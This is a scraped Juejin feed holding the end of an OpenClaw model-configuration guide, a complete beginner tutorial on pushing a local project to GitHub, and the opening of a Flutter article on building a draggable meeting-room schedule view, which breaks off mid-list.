<h3 data-id="heading-2"><strong>配置生效 + 验证模型状态</strong></h3>
<p>在终端运行以下指令，保证配置能够生效：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式一：停止服务后，再启动服务</span>
openclaw gateway stop
<span class="hljs-comment"># 等待 2-3 秒后启动服务</span>
openclaw gateway start
<span class="hljs-comment"># 方式二：直接使用重启命令</span>
openclaw gateway restart
</code></pre>
<p>你还可以通过以下指令看刚刚设置的模型是否被 Clawdbot 识别：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw models list
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7dad413a48345ccad9f4a735cb1cd42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=INJSWEYmNWOUbPbuNmqt6rpWc4Y%3D" alt="image.png" loading="lazy"/></p>
<p>你还可以通过以下指令进行一次真实连通探测（会发真实请求，可能产生费用~）</p>
<pre><code class="hljs language-bash" lang="bash">openclaw models status --probe
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1562e5d9d34d448d803d8fda4f7d58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=B%2ByahbntNMnFZef2zejOmUrYriE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">搞定</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33e2754ceb2a41d1b961876aef0f171f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=%2BEtOF%2F7POn4jOkmtxZOnoxlw3Jc%3D" alt="image.png" loading="lazy"/></p>
<p>参考文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1708855%3Fspm%3D5176.454194655176.J_L02u6VphiK2DqbAEtTYRj.3.1ba44859qmPsDh" target="_blank" title="https://developer.aliyun.com/article/1708855?spm=5176.454194655176.J_L02u6VphiK2DqbAEtTYRj.3.1ba44859qmPsDh" ref="nofollow noopener noreferrer">🦞 如何在 Moltbot 配置阿里云百炼 API-阿里云开发者社区</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[git版本控制]先有本地项目, 再进行github版本控制(亲测可用)]]></title>    <link>https://juejin.cn/post/7600752623068233738</link>    <guid>https://juejin.cn/post/7600752623068233738</guid>    <pubDate>2026-01-30T08:00:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068233738" data-draft-id="7600967006892310537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[git版本控制]先有本地项目, 再进行github版本控制(亲测可用)"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-30T08:00:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [git版本控制]先有本地项目, 再进行github版本控制(亲测可用)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:00:41.000Z" title="Fri Jan 30 2026 08:00:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我来为你提供一个完整的 GitHub 推送步骤：</p>
<h2 data-id="heading-0"><strong>步骤 1：准备工作</strong></h2>
<h3 data-id="heading-1">1.1 安装和配置 Git</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查是否已安装 Git</span>
git --version

<span class="hljs-comment"># 如果没有安装，先安装 Git</span>
<span class="hljs-comment"># Windows: 下载 Git for Windows</span>
<span class="hljs-comment"># Mac: brew install git</span>
<span class="hljs-comment"># Linux: sudo apt-get install git</span>

<span class="hljs-comment"># 配置用户名和邮箱</span>
git config --global user.name <span class="hljs-string">"你的名字"</span>
git config --global user.email <span class="hljs-string">"你的邮箱"</span>
</code></pre>
<h3 data-id="heading-2">1.2 创建 GitHub 账号（如果还没有）</h3>
<ul>
<li>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com" target="_blank" title="https://github.com" ref="nofollow noopener noreferrer">github.com</a> 注册账号</li>
<li>建议设置 SSH Key（可选但推荐）</li>
</ul>
<h2 data-id="heading-3"><strong>步骤 2：在 GitHub 上创建远程仓库</strong></h2>
<ol>
<li>登录 GitHub</li>
<li>点击右上角 "+" → "New repository"</li>
<li>填写仓库信息：
<ul>
<li>Repository name: 项目名称</li>
<li>Description: 项目描述（可选）</li>
<li>选择 Public（公开）或 Private（私有）</li>
<li><strong>不要</strong>勾选 "Initialize this repository with a README"（本地已有项目）</li>
</ul>
</li>
<li>点击 "Create repository"</li>
</ol>
<h2 data-id="heading-4"><strong>步骤 3：本地项目初始化</strong></h2>
<h3 data-id="heading-5">3.1 初始化 Git 仓库</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入项目目录</span>
<span class="hljs-built_in">cd</span> /path/to/your/project

<span class="hljs-comment"># 初始化本地仓库</span>
git init
</code></pre>
<h3 data-id="heading-6">3.2 创建 .gitignore 文件（重要）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建 .gitignore 文件，排除不需要版本控制的文件</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"node_modules/"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">".env"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">".DS_Store"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"dist/"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"build/"</span> &gt;&gt; .gitignore
<span class="hljs-comment"># 根据你的项目类型添加更多</span>
</code></pre>
<h3 data-id="heading-7">3.3 添加文件并提交</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看当前状态</span>
git status

<span class="hljs-comment"># 添加所有文件到暂存区（排除 .gitignore 中的文件）</span>
git add .

<span class="hljs-comment"># 或者选择性添加</span>
git add file1.js file2.css

<span class="hljs-comment"># 提交到本地仓库</span>
git commit -m <span class="hljs-string">"初始提交：项目基础框架"</span>
</code></pre>
<h2 data-id="heading-8"><strong>步骤 4：连接远程仓库并推送</strong></h2>
<h3 data-id="heading-9">4.1 添加远程仓库地址</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 复制 GitHub 提供的远程仓库地址</span>
<span class="hljs-comment"># HTTPS 方式（需要每次输入密码或 token）</span>
git remote add origin https://github.com/你的用户名/仓库名.git

<span class="hljs-comment"># 或者 SSH 方式（需要配置 SSH key）</span>
<span class="hljs-comment"># git remote add origin git@github.com:你的用户名/仓库名.git</span>

<span class="hljs-comment"># 验证远程仓库</span>
git remote -v
</code></pre>
<h3 data-id="heading-10">4.2 推送代码到 GitHub</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 第一次推送（-u 参数设置上游分支）</span>
git push -u origin main

<span class="hljs-comment"># 如果你本地分支是 master，需要先重命名</span>
git branch -M main
git push -u origin main
</code></pre>
<h2 data-id="heading-11"><strong>常见问题和解决方案</strong></h2>
<h3 data-id="heading-12">问题 1：推送被拒绝</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如果远程仓库有 README 等文件（之前误操作）</span>
git pull origin main --allow-unrelated-histories
<span class="hljs-comment"># 解决合并冲突（如果有）</span>
git push origin main
</code></pre>
<h3 data-id="heading-13">问题 2：需要身份验证</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 Personal Access Token（推荐）</span>
<span class="hljs-comment"># 1. GitHub → Settings → Developer settings → Personal access tokens</span>
<span class="hljs-comment"># 2. 生成新 token，勾选 repo 权限</span>
<span class="hljs-comment"># 3. 推送时使用 token 作为密码</span>
</code></pre>
<h3 data-id="heading-14">问题 3：配置 SSH Key（免密码推送）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成 SSH Key</span>
ssh-keygen -t ed25519 -C <span class="hljs-string">"your_email@example.com"</span>

<span class="hljs-comment"># 查看公钥并复制</span>
<span class="hljs-built_in">cat</span> ~/.ssh/id_ed25519.pub

<span class="hljs-comment"># 添加到 GitHub</span>
<span class="hljs-comment"># Settings → SSH and GPG keys → New SSH key</span>
</code></pre>
<h2 data-id="heading-15"><strong>步骤 5：后续日常操作</strong></h2>
<h3 data-id="heading-16">日常推送流程</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看修改状态</span>
git status

<span class="hljs-comment"># 2. 添加修改文件</span>
git add .

<span class="hljs-comment"># 3. 提交到本地</span>
git commit -m <span class="hljs-string">"提交描述"</span>

<span class="hljs-comment"># 4. 拉取远程最新代码（避免冲突）</span>
git pull origin main

<span class="hljs-comment"># 5. 推送到远程</span>
git push origin main
</code></pre>
<h3 data-id="heading-17">分支管理（推荐）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建新分支</span>
git branch feature/new-feature
git checkout feature/new-feature

<span class="hljs-comment"># 或者一步创建并切换</span>
git checkout -b feature/new-feature

<span class="hljs-comment"># 合并分支</span>
git checkout main
git merge feature/new-feature
</code></pre>
<h2 data-id="heading-18"><strong>快速命令总结</strong></h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 完整流程（已有项目首次推送）</span>
<span class="hljs-built_in">cd</span> your-project
git init
git add .
git commit -m <span class="hljs-string">"first commit"</span>
git branch -M main
git remote add origin https://github.com/username/repo.git
git push -u origin main
</code></pre>
<h2 data-id="heading-19"><strong>额外建议</strong></h2>
<ol>
<li><strong>提交规范</strong>：使用清晰的提交信息</li>
<li><strong>分支策略</strong>：建议使用 Git Flow 或 GitHub Flow</li>
<li><strong>.gitignore</strong>：确保包含所有敏感文件和临时文件</li>
<li><strong>README.md</strong>：添加项目说明文档</li>
</ol>
<p>按照这个流程，你的项目应该能成功推送到 GitHub。如果遇到具体问题，可以告诉我错误信息，我会帮你解决！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[冲冲冲，Flutter拖拉拽实战，高仿飞书会议室详情页]]></title>    <link>https://juejin.cn/post/7600955777315749926</link>    <guid>https://juejin.cn/post/7600955777315749926</guid>    <pubDate>2026-01-30T10:39:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315749926" data-draft-id="7377026952786329637" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="冲冲冲，Flutter拖拉拽实战，高仿飞书会议室详情页"/> <meta itemprop="keywords" content="Flutter,前端,GitHub"/> <meta itemprop="datePublished" content="2026-01-30T10:39:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="rainboy"/> <meta itemprop="url" content="https://juejin.cn/user/3808364011199591"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            冲冲冲，Flutter拖拉拽实战，高仿飞书会议室详情页
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808364011199591/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    rainboy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T10:39:35.000Z" title="Fri Jan 30 2026 10:39:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">实现效果</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c79637f47d3a4d48af526a4343d94a63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=4hUTxRXPLZsU2aH%2F%2BX8sUqLacSQ%3D" alt="schedule.gif" loading="lazy"/></p>
<h2 data-id="heading-1">主要功能</h2>
<ul>
<li>📉可视化事件列表，会议室状态一览无余，清晰直观</li>
<li>💥支持拖拽选择预订时间，交互自然，纵享丝滑</li>
<li>🌈提供丰富的样式配置选项，满足不同场景的视觉需求</li>
</ul>
<h2 data-id="heading-2">技术实现</h2>
<h3 data-id="heading-3">实现主界面</h3>
<p>采用模块化设计思想，核心控件为<code>DayView</code>，用于展示单日会议室预订事件。整体架构采用<code>SingleChildScrollView</code>作为外层容器实现垂直滚动，内部使用<code>Stack</code>布局管理多个视觉元素。</p>
<ul>
<li><strong>左侧时间轴组件</strong>：负责绘制00:00-24:00的时间文本，为用户提供时间参考</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-keyword">if</span> (widget.hoursColumnStyle.width &gt; <span class="hljs-number">0</span>) {
  children.add(Positioned(
    top: <span class="hljs-number">0</span>,
    left: widget.isRTL ? <span class="hljs-keyword">null</span> : <span class="hljs-number">0</span>,
    child: HoursColumn.fromHeadersWidgetState(parent: <span class="hljs-keyword">this</span>),
  ));
}
</code></pre>
<ul>
<li><strong>右侧背景时间线网格</strong>：自定义<code>CustomPaint</code>实现每小时的时间分割线</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
Widget createBackground() =&gt; Positioned.fill(
      child: CustomPaint(
        painter: widget.style.createBackgroundPainter(
          dayView: widget,
          topOffsetCalculator: calculateTopOffset,
        ),
      ),
    );

</code></pre>
<ul>
<li><strong>当前时间指示器</strong>：通过<code>RepaintBoundary</code>和<code>CustomPaint</code>实现实时更新的当前时间线</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-keyword">if</span> (_showCurrentTimeIndicator()) {
  Widget? currentTimeIndicator =
      (widget.currentTimeIndicatorBuilder ?? DefaultBuilders.defaultCurrentTimeIndicatorBuilder)(widget.style, calculateTopOffset, widget.hoursColumnStyle, widget.isRTL,_currentTimeNotifier);
  <span class="hljs-keyword">if</span> (currentTimeIndicator != <span class="hljs-keyword">null</span>) {
    children.add(currentTimeIndicator);
  }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f32e72570e34d86b2e1d3443c0c2399~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=mTjCDf2MitnJcl%2BDL5QiAXc%2BR28%3D" alt="ui.png" loading="lazy"/></p>
<ul>
<li><strong>事件列表渲染</strong>：基于<code>FlutterWeekViewEvent</code>数据模型，动态生成会议室预订事件卡片</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
children.addAll(eventsDrawProperties.entries.map((entry) =&gt; entry.value.createWidget(
      context,
      widget,
      buildResizeUpGestureDetector(entry.key),
      buildResizeDownGestureDetector(entry.key),
      entry.key,
    )));
</code></pre>
<p><strong>事件数据结构</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">event.dart</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlutterWeekViewEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">FlutterWeekViewEvent</span>&gt; </span>{
   <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> title;         <span class="hljs-comment">// 事件标题</span>
   <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> description;   <span class="hljs-comment">// 事件描述</span>
   <span class="hljs-built_in">DateTime</span> start;             <span class="hljs-comment">// 开始时间</span>
   <span class="hljs-built_in">DateTime</span> end;               <span class="hljs-comment">// 结束时间</span>
   <span class="hljs-comment">// 其他属性...</span>
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15fdf64ec7594e6f8ebda93006d365b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=xHMXuYpk%2BfVUs%2ByIwr0Fuqgqh4w%3D" alt="events.png" loading="lazy"/></p>
<h3 data-id="heading-4">实现拖拽调整功能</h3>
<p>通过<code>GestureDetector</code>组件实现事件的垂直拖拽调整，支持修改事件的开始和结束时间：</p>
<ol>
<li><strong>拖拽手势监听</strong>：为<strong>新创建事件</strong>添加两个<code>GestureDetector</code>，分别处理上下拖拽操作</li>
